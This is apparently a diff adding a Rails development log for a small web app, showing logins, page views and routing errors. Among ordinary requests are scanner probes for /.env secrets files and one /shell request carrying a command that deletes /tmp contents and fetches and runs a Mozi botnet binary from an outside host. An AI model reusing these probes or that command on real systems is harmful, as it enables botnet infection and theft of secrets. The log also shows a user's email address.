+  Parameters: {"authenticity_token"=>"[FILTERED]", "email"=>"mohak_k@ph.iitr.ac.in", "password"=>"[FILTERED]", "commit"=>"Log In"}
+  [1m[36mMember Load (1.1ms)[0m  [1m[34mSELECT "members".* FROM "members" WHERE "members"."email" = $1 LIMIT $2[0m  [["email", "mohak_k@ph.iitr.ac.in"], ["LIMIT", 1]]
+  ↳ app/controllers/logging_controller.rb:5:in `loginp'
+Redirected to http://13.127.46.121/shlok/ashlokr
+Completed 302 Found in 18ms (ActiveRecord: 8.1ms | Allocations: 4601)
+
+
+Started GET "/shlok/ashlokr" for 152.57.185.104 at 2022-01-06 04:33:51 +0000
+Cannot render console from 152.57.185.104! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (1.2ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 3.6ms | Allocations: 1007)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 8.8ms | Allocations: 4161)
+Completed 200 OK in 12ms (Views: 8.2ms | ActiveRecord: 1.2ms | Allocations: 4658)
+
+
+Started GET "/.env" for 44.234.88.174 at 2022-01-06 04:39:32 +0000
+Cannot render console from 44.234.88.174! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/.env"):
+  
+Started POST "/" for 44.234.88.174 at 2022-01-06 04:39:32 +0000
+Cannot render console from 44.234.88.174! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [POST] "/"):
+  
+Started GET "/shlok/4" for 152.57.185.104 at 2022-01-06 04:41:17 +0000
+Cannot render console from 152.57.185.104! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashloku as HTML
+  Parameters: {"id"=>"4"}
+  [1m[36mShlok Load (0.8ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks" WHERE "shloks"."sid" = $1 LIMIT $2[0m  [["sid", 4], ["LIMIT", 1]]
+  ↳ app/controllers/shlok_controller.rb:34:in `ashloku'
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashloku.html.erb within layouts/application
+  Rendered shlok/ashloku.html.erb within layouts/application (Duration: 1.6ms | Allocations: 730)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 6.8ms | Allocations: 3763)
+Completed 200 OK in 30ms (Views: 7.5ms | ActiveRecord: 12.7ms | Allocations: 8213)
+
+
+Started GET "/" for 152.57.185.104 at 2022-01-06 04:44:23 +0000
+Cannot render console from 152.57.185.104! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 45)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 4.8ms | Allocations: 3097)
+Completed 200 OK in 6ms (Views: 5.3ms | ActiveRecord: 0.0ms | Allocations: 3483)
+
+
+Started GET "/.env" for 109.237.103.9 at 2022-01-06 04:50:55 +0000
+Cannot render console from 109.237.103.9! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/.env"):
+  
+Started GET "/events/revents" for 103.37.201.183 at 2022-01-06 04:56:58 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by EventsController#revents as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering events/revents.html.erb within layouts/application
+  Rendered events/revents.html.erb within layouts/application (Duration: 0.3ms | Allocations: 139)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 6.9ms | Allocations: 3383)
+Completed 200 OK in 10ms (Views: 8.8ms | Allocations: 4504)
+
+
+Started GET "/logging/login" for 103.37.201.183 at 2022-01-06 04:56:59 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#login as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering logging/login.html.erb within layouts/application
+  Rendered logging/login.html.erb within layouts/application (Duration: 0.6ms | Allocations: 324)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 4.9ms | Allocations: 3355)
+Completed 200 OK in 6ms (Views: 5.4ms | Allocations: 3819)
+
+
+Started POST "/logging/loginp" for 103.37.201.183 at 2022-01-06 04:57:05 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#loginp as HTML
+  Parameters: {"authenticity_token"=>"[FILTERED]", "email"=>"mohak_k@ph.iitr.ac.in", "password"=>"[FILTERED]", "commit"=>"Log In"}
+  [1m[36mMember Load (1.1ms)[0m  [1m[34mSELECT "members".* FROM "members" WHERE "members"."email" = $1 LIMIT $2[0m  [["email", "mohak_k@ph.iitr.ac.in"], ["LIMIT", 1]]
+  ↳ app/controllers/logging_controller.rb:5:in `loginp'
+Redirected to http://13.127.46.121/shlok/ashlokr
+Completed 302 Found in 22ms (ActiveRecord: 14.0ms | Allocations: 4216)
+
+
+Started GET "/shlok/ashlokr" for 103.37.201.183 at 2022-01-06 04:57:05 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (2.1ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 8.4ms | Allocations: 1066)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 18.5ms | Allocations: 4094)
+Completed 200 OK in 22ms (Views: 17.2ms | ActiveRecord: 2.1ms | Allocations: 4513)
+
+
+Started POST "/" for 135.125.217.54 at 2022-01-06 05:06:52 +0000
+Cannot render console from 135.125.217.54! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [POST] "/"):
+  
+Started GET "/.env" for 135.125.217.54 at 2022-01-06 05:06:52 +0000
+Cannot render console from 135.125.217.54! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/.env"):
+  
+Started GET "/shell?cd+/tmp;rm+-rf+*;wget+http://115.63.165.225:58220/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws" for 115.63.165.225 at 2022-01-06 05:08:46 +0000
+Cannot render console from 115.63.165.225! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/shell"):
+  
+Started GET "/" for 43.131.22.185 at 2022-01-06 05:12:18 +0000
+Cannot render console from 43.131.22.185! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 45)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 5.2ms | Allocations: 3113)
+Completed 200 OK in 6ms (Views: 5.7ms | Allocations: 3495)
+
+
+Started GET "/.env" for 147.182.195.163 at 2022-01-06 05:13:28 +0000
+Cannot render console from 147.182.195.163! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/.env"):
+  
+Started POST "/" for 147.182.195.163 at 2022-01-06 05:13:29 +0000
+Cannot render console from 147.182.195.163! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [POST] "/"):
+  
+  [1m[35m (0.2ms)[0m  [1m[34mSELECT pg_try_advisory_lock(1409038475602093665)[0m
+  [1m[35m (0.6ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+  [1m[36mActiveRecord::InternalMetadata Load (0.3ms)[0m  [1m[34mSELECT "ar_internal_metadata".* FROM "ar_internal_metadata" WHERE "ar_internal_metadata"."key" = $1 LIMIT $2[0m  [["key", "environment"], ["LIMIT", 1]]
+  [1m[35m (0.2ms)[0m  [1m[34mSELECT pg_advisory_unlock(1409038475602093665)[0m
+  [1m[35m (0.5ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
